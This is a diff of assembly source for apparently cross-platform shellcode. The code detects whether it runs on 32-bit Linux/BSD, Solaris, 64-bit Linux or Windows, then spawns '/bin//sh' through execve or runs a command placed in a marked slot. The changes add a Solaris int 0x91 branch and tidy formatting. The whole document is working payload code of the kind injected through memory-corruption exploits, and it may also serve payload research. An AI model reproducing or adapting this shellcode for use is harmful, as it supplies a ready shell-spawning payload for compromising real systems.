@@ -70,7 +70,6 @@ get_os:
     push    esp               ; save argv
     push    edi               ; save pointer to "/bin//sh", 0
     
-    mov     al, 6             ; eax=sys_close for Linux/BSD
     inc     ecx               ; ignored on x64
     jecxz   gos_x64           ; if ecx==0 we're 64-bit
     
@@ -87,19 +86,31 @@ get_os:
     
     ; we're 32-bit Linux
     mov     al, 11            ; eax=sys_execve
+    cdq
     pop     ebx               ; ebx="/bin//sh", 0
     pop     ecx               ; ecx=argv
+    
+    push    edx               ; environment
+    push    ecx               ; argv
+    push    ebx               ; "/bin//sh", 0
+    push    esp
+    mov     di, gs
+    shr     di, 8
+    jnz     solaris_x86
     int     0x80
+solaris_x86:
+    int     0x91
     
     ; we're 64-bit, execute syscall and see what
     ; error returned
 gos_x64:
+    mov     al, 6            ; eax=sys_close for Linux/BSD
     push    -1
     pop     edi
     syscall
-    cmp     al, 5             ; Windows 7
+    cmp     al, 5            ; Windows 7
     je      win_cmd
-    cmp     al, 8             ; Windows 10
+    cmp     al, 8            ; Windows 10
     je      win_cmd
     
     push    59               ; sys_execve
@@ -177,7 +188,7 @@ cmd_end:
     pop     esi
     ret
 ld_cmd:
-    call   get_os
+    call    get_os
     ; place command here
     ;db     "notepad", 0xFF
     ; do not change anything below  
